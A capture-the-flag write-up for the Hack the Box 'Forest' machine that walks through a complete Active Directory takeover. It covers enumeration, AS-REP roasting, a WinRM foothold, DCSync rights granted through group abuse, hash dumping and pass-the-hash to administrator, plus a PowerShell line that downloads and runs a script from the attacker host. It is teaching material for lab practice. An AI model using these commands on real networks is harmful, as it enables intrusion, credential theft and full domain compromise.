# Hack the Box - Forest

```CSS
Machine IP: 10.10.10.161
```

## NMAP
### All TCP Ports
```CSS
▶ nmap -Pn -sS -p- -T4 --min-rate 1000 10.10.10.161 -oG nmap.surface

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 15:08 IST
Nmap scan report for 10.10.10.161
Host is up (0.10s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
```

### Open TCP Ports
```CSS
▶ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.10.161 -oG nmap.deep

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 16:45 IST
Nmap scan report for forest.htb (10.10.10.161)
Host is up (0.087s latency). 
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-29 11:22:23Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?                                                
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped                                               
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped                                               
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                                                 
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:                                                    
| smb2-security-mode:                                                   
|   311:                                                                
|_    Message signing enabled and required                              
| smb-security-mode:                                                    
|   account_used: <blank>                                               
|   authentication_level: user                                          
|   challenge_response: supported                                       
|_  message_signing: required                                           
|_clock-skew: mean: 2h26m52s, deviation: 4h02m30s, median: 6m51s
| smb-os-discovery:                                                     
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST                                               
|   NetBIOS computer name: FOREST\x00                                   
|   Domain name: htb.local                                              
|   Forest name: htb.local                                              
|   FQDN: FOREST.htb.local                                              
|_  System time: 2023-03-29T04:22:29-07:00                              
| smb2-time:                                                            
|   date: 2023-03-29T11:22:32                                           
|_  start_date: 2023-03-29T09:42:02                                     

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds                      
```

### Open UDP Ports
```CSS
▶ nmap -sU -p- 10.10.10.161 --min-rate 1000 -oN nmap.udp

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 17:05 IST
Nmap scan report for 10.10.10.161
Host is up (0.091s latency).
Not shown: 65457 open|filtered ports, 74 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
389/udp   open  ldap
58399/udp open  unknown
58507/udp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
```

---

## DNS
### Leak Hostname
  - `nslookup`: Hostname was not leaked.
```CSS
▶ nslookup
> server 10.10.10.161
Default server: 10.10.10.161
Address: 10.10.10.161#53
> 127.0.0.1
.;; communications error to 10.10.10.161#53: timed out
1.0.0.127.in-addr.arpa  name = localhost.
```

---

## SMB
### Anonymous Login
  - `smbclient`: Anonymous login successful, no shares found.
  - `smbmap`: Anonymous login successful, no shares found.
```CSS
▶ smbclient -L 10.10.10.161
```
![image](https://user-images.githubusercontent.com/83878909/231100575-18e6bc13-9760-4c37-ac20-4eb1afeea6a5.png)

```CSS
▶ smbmap -H 10.10.10.161
```
![image](https://user-images.githubusercontent.com/83878909/231099947-bb13c839-109a-4aa2-b577-e89a1f0cd8da.png)

---

## LDAP
### Gather Information
```CSS
▶ ldapsearch -H ldap://forest.htb -x -s base namingcontexts
```
![image](https://user-images.githubusercontent.com/83878909/231105312-71ae0491-7044-4596-a949-791885c27529.png)
```CSS
▶ ldapsearch -H ldap://forest.htb -x -b "DC=htb,DC=local" > ldap-anonymous.out
```
![image](https://user-images.githubusercontent.com/83878909/231106400-0e50072f-8e8d-4088-aa50-a4c2bc95078c.png)

### List of Users
```CSS
▶ ldapsearch -H ldap://forest.htb -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep sAMAccountName
```
![image](https://user-images.githubusercontent.com/83878909/231109597-909a7111-c95c-47f7-804b-88f4611ff7bc.png)

```CSS
Sebastien Caron
Santi Rodriguez
Lucinda Berger
Andy Hislip
Mark Brandt
```

---

## RPC
### Gather Information
  - `rpcclient`: Connect to the target as an anonymous user using a "null-session".
  - `rpcclient` - `enumdomusers`: Enumerate users in the domain.
```CSS
▶ rpcclient -U "" -N forest.htb
rpcclient $> enumdomusers
```
![image](https://user-images.githubusercontent.com/83878909/231115644-07f50007-e232-4e1a-bbd3-f5caa3304655.png)

  - Another user `svc-alfresco` discovered.
  - Updated list of users.
```CSS
sebastien
santi
lucinda
andy
mark
svc-alfresco
```

### User Groups
```CSS
rpcclient $> queryusergroups 0x47b
        group rid:[0x201] attr:[0x7]
        group rid:[0x47c] attr:[0x7]
rpcclient $> querygroup 0x201
        Group Name:     Domain Users
        Description:    All domain users
        Group Attribute:7
        Num Members:30
rpcclient $> querygroup 0x47c
        Group Name:     Service Accounts
        Description:
        Group Attribute:7
        Num Members:1
```
![image](https://user-images.githubusercontent.com/83878909/231127882-51b87c41-6484-4f19-92ac-16b225f230ff.png)

---

## AS-REP Roasting
### Get Hash
  - `impacket-GetNPUsers`: Get users who not require Kerberos preauthentication.
```CSS
▶ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt
```
![image](https://user-images.githubusercontent.com/83878909/231133087-8e74b0d1-716c-4184-9169-9a5236ebe78e.png)

### Crack Hash
```CSS
▶ john --wordlist=/usr/share/wordlists/rockyou.txt krb5.hash
```
![image](https://user-images.githubusercontent.com/83878909/231135411-2c72d954-43c2-4657-9dce-00101633f7be.png)

  - Password for service account user `svc-alfresco`: `s3rvice`

---

## Foothold
```CSS
▶ evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
```
![image](https://user-images.githubusercontent.com/83878909/231141723-17ad9489-509d-4273-a5a8-3528bdaf934f.png)

---

## Privilege Escalation
### WinPEAS
  - Setup share to run `winPEASx64.exe`
``` CSS
▶ impacket-smbserver pwnshare $(pwd) -smb2support -user random -password passwd
```
  - Create Credential Object and Access Share as Drive
```CSS
*Evil-WinRM* PS C:\> $pass = convertto-securestring 'passwd' -AsPlainText -Force
*Evil-WinRM* PS C:\> $cred = New-Object System.Management.Automation.PSCredential('random', $pass)
*Evil-WinRM* PS C:\> New-PSDrive -Name pwndrive -PSProvider FileSystem -Credential $cred -Root \\10.10.14.28\pwnshare
```
![image](https://user-images.githubusercontent.com/83878909/231182636-fb2c4894-58e8-4da8-a09c-99161fd0b09c.png)
  
  - `WinPEAS` did not return any useful information.

---

### Enumerate DOM Users
```CSS
*Evil-WinRM* PS C:\> net user /domain
```
![image](https://user-images.githubusercontent.com/83878909/231516040-cf5e557c-e8dc-4380-874e-6d1de1d2abf4.png)

### Enumerate the Current User
```CSS
*Evil-WinRM* PS C:\> net user svc-alfresco
```
![image](https://user-images.githubusercontent.com/83878909/231516645-ef3607ec-789e-4e0e-a86d-3915f8378b0f.png)

---

### BloodHound
  - Start Neo4j
```CSS
▶ neo4j console
```

  - Start BloodHound
```CSS
▶ bloodhound --no-sandbox
```

  - Execute Bloodhound-Python
```
▶ bloodhound-python -u svc-alfresco -p s3rvice -ns 10.10.10.161 -d HTB.local -c All 
```
  
  - Import all `.json` files to BloodHound.


  - Mark `SVC-ALFRESCO@HTB.LOCAL` as owned and set as starting node.
  - Set `HTB.LOCAL` as ending node. 
![image](https://user-images.githubusercontent.com/83878909/231216827-1f4e7ae2-9738-49b8-affd-46d16113a566.png)

![image](https://user-images.githubusercontent.com/83878909/231560688-e9a29326-4d1e-462b-bf9a-151694e9d952.png)

![image](https://user-images.githubusercontent.com/83878909/231561418-8c47542f-1f78-4c4d-9762-0211e59923bb.png)

![image](https://user-images.githubusercontent.com/83878909/231561547-2b048aa9-0a83-42b1-ae69-e17eae8aa0e7.png)

![image](https://user-images.githubusercontent.com/83878909/231672978-14a4767f-c968-48cd-b349-42cd7dfa50bc.png)

  - Create a new user in the domain.
  - This is possible because svc-alfresco is a member of the group Account Operators.
```CSS
C:\> net user random passwd123 /add /domain
```
  - Add the new user to the "Exchange Windows Permissions" group.
  - This is possible because svc-alfresco has GenericAll permissions on the Exchange Windows Permissions group.
```CSS
C:\> net group "Exchange Windows Permissions" random /add /domain
```
  - Start a python local server on the attacker machine.
  - Download `PowerView.ps1` on Forest.
```CSS
C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.28/PowerView.ps1')
```
  - Use the Add-DomainObjectAcl function in PowerView to give the user DCSync privileges.
  - This is possible because the user is a part of the Exchange Windows Permissions group which has WriteDacl permission on the htb.local domain.
```CSS
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $pass = convertto-securestring 'passwd123' -asplain -force
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $cred = New-Object System.Management.Automation.PSCredential('htb\random', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity random -Rights DCSync
---
## If the above command does not work try the below. Sometimes it is necessary to specify the target in a different way.
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> Add-DomainObjectAcl -Credentials $cred – TargetIdentity htb.local -PrincipalIdentity random -Rights DCSync
```
![image](https://user-images.githubusercontent.com/83878909/231679673-783389bb-0226-414b-97fc-673e3f8d516f.png)

![image](https://user-images.githubusercontent.com/83878909/231682343-0ec66aa4-a7c3-4536-87d1-c4346db7fb4d.png)

---

### Dump NTLM Hashes
  - Use the `impacket-secretsdump` script to dump the NTLM password hashes of all the users on the domain as well as the administrator.
```CSS
▶ impacket-secretsdump htb.local/random:passwd123@10.10.10.161
```

---

### Pass the Hash Attack
  -  script to perform a pass the hash attack with the Administrator’s hash.
```
▶ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```
![image](https://user-images.githubusercontent.com/83878909/231684320-89710ea2-6063-47ab-ba97-03a4750a0863.png)
